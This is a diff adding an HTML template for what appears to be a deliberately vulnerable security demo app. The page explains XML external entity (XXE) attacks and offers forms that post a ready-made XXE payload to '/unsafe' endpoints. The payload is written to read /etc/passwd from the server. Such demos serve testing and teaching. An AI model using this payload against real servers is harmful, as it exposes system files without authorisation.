@@ -1,0 +1,28 @@
+{{define "xxe"}}
+<h1 class="page-header">{{.Name}}</h1>
+{{template "ruleInfo" .}}
+<p>
+  The following XML snippet is crafted to exploit SAX parsers that
+  are configured to allow for external entity processing. If successful,
+  the exploit will instruct the parser to read the <code>/etc/passwd</code>
+  file from the server's file system.
+</p>
+{{range .Sinks}}
+<div class="row">
+  <div class="col-xs-12 col-sm-6" style="padding-bottom: 30px;">
+    <h4 class="sub-header">
+      <code>{{.Name}}</code>
+    </h4>
+    <form method="{{.Method}}" action="{{.Url}}/unsafe" target="_blank">
+      <div class="form-group">
+        <input name="input" class="form-control" value="&lt;!DOCTYPE read-fs [&lt;!ELEMENT read-fs ANY &gt;&lt;!ENTITY passwd SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;users&gt;&lt;user&gt;&lt;read-fs&gt;&amp;passwd;&lt;/read-fs&gt;&lt;name&gt;C.K Frode&lt;/name&gt;&lt;/user&gt;&lt;/users&gt;" />
+      </div>
+      <button type="submit" class="btn btn-primary">Submit</button>
+    </form>
+  </div>
+</div>
+{{end}}
+{{template "safeButtons"}}
+{{end}}
+
+{{template "xxe" .}}
